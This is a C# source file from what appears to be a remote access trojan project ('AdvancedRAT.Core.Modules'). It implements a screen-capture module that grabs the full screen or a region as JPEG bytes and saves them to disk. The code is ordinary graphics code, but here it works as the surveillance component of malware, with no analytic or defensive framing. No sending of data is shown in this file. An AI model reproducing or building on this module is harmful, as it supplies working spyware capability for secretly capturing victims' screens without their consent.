using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;

namespace AdvancedRAT.Core.Modules
{
    public class ScreenCapture
    {
        public static async Task<byte[]> CaptureScreen()
        {
            return await Task.Run(() =>
            {
                try
                {
                    Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics graphics = Graphics.FromImage(bitmap))
                        {
                            graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                        }
                        
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap.Save(ms, ImageFormat.Jpeg);
                            return ms.ToArray();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Screen capture failed: {ex.Message}");
                    return new byte[0];
                }
            });
        }
        
        public static async Task<byte[]> CaptureRegion(Rectangle region)
        {
            return await Task.Run(() =>
            {
                try
                {
                    using (Bitmap bitmap = new Bitmap(region.Width, region.Height))
                    {
                        using (Graphics graphics = Graphics.FromImage(bitmap))
                        {
                            graphics.CopyFromScreen(region.Location, Point.Empty, region.Size);
                        }
                        
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap.Save(ms, ImageFormat.Jpeg);
                            return ms.ToArray();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Region capture failed: {ex.Message}");
                    return new byte[0];
                }
            });
        }
        
        public static async Task SaveScreenshotToFile(string filePath)
        {
            byte[] imageData = await CaptureScreen();
            if (imageData.Length > 0)
            {
                File.WriteAllBytes(filePath, imageData);
            }
        }
    }
}